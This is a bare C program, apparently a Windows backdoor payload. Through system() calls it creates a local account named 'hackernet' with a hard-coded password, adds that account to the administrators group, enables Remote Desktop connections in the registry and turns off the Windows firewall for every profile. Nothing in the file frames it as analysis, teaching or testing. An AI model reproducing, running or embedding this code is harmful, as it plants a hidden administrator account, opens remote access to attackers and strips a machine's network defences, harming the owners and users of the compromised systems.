#include <stdlib.h>
int main ()
{
int i,j,k;
    i = system("net user /add hackernet hackern3t@123 && net localgroup administrators hackernet /add");
    j = system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
    k = system("Netsh advfirewall set privateprofile state off && Netsh advfirewall set publicprofile state off  && Netsh advfirewall set domainprofile state off");

return 0;
}
